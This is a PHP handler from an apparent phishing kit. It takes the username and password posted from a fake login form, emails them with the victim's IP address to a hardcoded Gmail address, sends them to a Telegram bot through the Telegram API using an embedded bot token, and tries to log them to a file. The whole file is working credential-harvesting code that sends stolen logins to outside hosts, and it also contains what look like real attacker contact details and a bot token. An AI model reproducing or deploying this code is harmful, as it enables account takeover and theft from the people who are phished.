<?php
$ip = getenv("REMOTE_ADDR");
$login = $_POST['ai'];
$passwd= $_POST['pr'];
$ip= $_POST['ippp'];

$done = array('signal'=>'ok');
$bad = array('signal'=>'bad');


if (!empty($login) && !empty($passwd)) {


    $own = 'mercywii1994@gmail.com';
    $date = date("D/M/d, Y g:i a");
    $subj = "NEW: $login";
    $from = "From:LOG DON SHOW! <mail@me.mom163.com>";
    $msg = "IP: $ip\n-----------------------------------\nUsername: $login\nPassword: $passwd\nSubmitted on $date\n-----------------------------------\n        Good God \n-----------------------------------";
    mail($own,$subj,$msg,$from);

    $botToken = '6240113214:AAGXV_HOoFBXYgGm2XdTjD3kxrUJASkl9MQ'; // Replace with your bot token
    $chatId = '';

    // Telegram API URL
    $apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // Prepare the message data
    $data = array(
        'chat_id' => $chatId,
        'text' => $msg
    );

    // Use cURL to send the message
    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute the cURL request
    $response = curl_exec($ch);
    curl_close($ch);

    ///////////////////////////////////////////////////////////////////////


    echo json_encode($done);

    }

else {
  echo json_encode($bad);
}
$fp = fopen("","a");
fputs($fp,$msg);
fclose($fp);







//  $mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
// $subject = "KSA MAIL";
// mail('mercywii1994@gmail.com', $subject,$mesaj, $mailHeaders);
?>